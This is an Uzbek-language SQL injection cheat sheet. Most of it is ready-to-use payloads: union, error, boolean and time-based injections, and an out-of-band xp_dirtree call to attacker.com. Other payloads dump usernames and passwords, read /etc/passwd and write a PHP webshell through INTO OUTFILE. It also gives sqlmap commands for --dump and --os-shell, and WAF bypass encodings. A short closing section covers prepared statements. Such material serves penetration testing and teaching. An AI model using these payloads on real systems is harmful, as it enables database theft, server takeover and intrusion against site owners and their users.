# SQL Injection — To'liq Qo'llanma

## SQL Injection nima?

Foydalanuvchi kiritgan ma'lumot SQL so'roviga qo'shilib, kutilmagan amallarga olib kelganda paydo bo'ladi.

```php
// Zaif kod (PHP)
$query = "SELECT * FROM users WHERE username='" . $_GET['user'] . "'";

// Normal so'rov: SELECT * FROM users WHERE username='admin'
// Hujum:         SELECT * FROM users WHERE username='admin'--'
```

## SQLi Turlari

### 1. In-band SQLi (natija to'g'ridan-to'g'ri ko'rinadi)

**Error-based** — xato xabari ma'lumot beradi:
```sql
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()))) --
```

**Union-based** — UNION orqali qo'shimcha ma'lumot:
```sql
' UNION SELECT null,username,password FROM users --
```

### 2. Blind SQLi (natija ko'rinmaydi)

**Boolean-based** — True/False holat:
```sql
' AND 1=1 --    (sahifa normal ko'rinadi)
' AND 1=2 --    (sahifa bo'sh yoki xato)
' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a' --
```

**Time-based** — Vaqt kechikishi:
```sql
' AND SLEEP(5) --          (MySQL)
' AND pg_sleep(5) --       (PostgreSQL)
'; WAITFOR DELAY '0:0:5'-- (MSSQL)
```

### 3. Out-of-band SQLi (boshqa kanal orqali)
```sql
-- DNS orqali (MSSQL)
'; exec master..xp_dirtree '//attacker.com/test' --
```

## Asosiy Payloadlar

```sql
-- Kirish testlari
'
''
`
')
'))
"
""
")
"))

-- Izoh uslublari
--
-- -
#
/*comment*/
/*!comment*/

-- Boolean testlar
' OR '1'='1
' OR 1=1--
' OR 'x'='x
admin'--
' OR ''='

-- UNION so'rovlari
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
-- Ustun sonini toping, keyin:
' UNION SELECT 1,2,3--
' UNION SELECT table_name,2,3 FROM information_schema.tables--
```

## MySQL — Asosiy Teknikalar

```sql
-- Versiya
' UNION SELECT version(),2,3--

-- Ma'lumotlar bazalari
' UNION SELECT schema_name,2,3 FROM information_schema.schemata--

-- Jadvallar
' UNION SELECT table_name,2,3 FROM information_schema.tables 
  WHERE table_schema='targetdb'--

-- Ustunlar
' UNION SELECT column_name,2,3 FROM information_schema.columns 
  WHERE table_name='users'--

-- Ma'lumot chiqarish
' UNION SELECT username,password,3 FROM users--

-- Faylni o'qish
' UNION SELECT LOAD_FILE('/etc/passwd'),2,3--

-- Faylga yozish (webshell!)
' UNION SELECT "<?php system($_GET['cmd']); ?>",2,3 
  INTO OUTFILE '/var/www/html/shell.php'--
```

## SQLmap — Avtomatlashtirilgan Test

```bash
# Asosiy skan
sqlmap -u "http://example.com/item?id=1"

# POST so'rov
sqlmap -u "http://example.com/login" \
  --data="user=admin&pass=test"

# Cookie bilan
sqlmap -u "http://example.com/profile" \
  --cookie="session=abc123"

# Burp Suite dan so'rovni saqlash
sqlmap -r request.txt

# Ma'lumotlar bazalarini sanash
sqlmap -u "http://example.com/?id=1" --dbs

# Jadvallarni sanash
sqlmap -u "http://example.com/?id=1" -D database --tables

# Ma'lumotlarni chiqarish
sqlmap -u "http://example.com/?id=1" \
  -D database -T users --dump

# OS shell (agar imkon bo'lsa)
sqlmap -u "http://example.com/?id=1" --os-shell

# Barcha teknikalar
sqlmap -u "http://example.com/?id=1" --technique=BEUSTQ

# Tezlik
sqlmap -u "http://example.com/?id=1" --level=5 --risk=3
```

## WAF Bypass Texnikalari

```sql
-- Bo'sh joy o'rniga
/**/SELECT/**/username/**/FROM/**/users
SELECT%09username%09FROM%09users
SELECT%0aUSERNAME%0aFROM%0aUSERS

-- Case mixing
SeLeCt UsErNaMe FrOm UsErS

-- Encoding
' OR 0x61=0x61--      (0x61 = 'a')
' OR CHAR(97)=CHAR(97)--

-- Double encoding
%2527 → %27 → '
```

## SQLi Oldini Olish

```php
// Yaxshi — Prepared Statement (PHP PDO)
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$username]);

// Yaxshi — Parameterli so'rov
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$stmt->bindParam(':id', $id, PDO::PARAM_INT);

// YOMON — String biriktirish
$query = "SELECT * FROM users WHERE id = " . $id;
```

```python
# Python — psycopg2 (PostgreSQL)
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

# SQLAlchemy ORM
User.query.filter_by(username=username).first()
```

## SQLi Topish — Recon

```bash
# Zaif parametrlarni topish
ffuf -u "http://example.com/FUZZ=1'" -w params.txt \
  -mr "SQL|syntax|mysql|error"

# Ghaib
ghaib -u "http://example.com/item?id=1"

# Manul test — xato tekshirish
curl "http://example.com/item?id=1'"
curl "http://example.com/item?id=1 AND 1=1"
curl "http://example.com/item?id=1 AND 1=2"
```
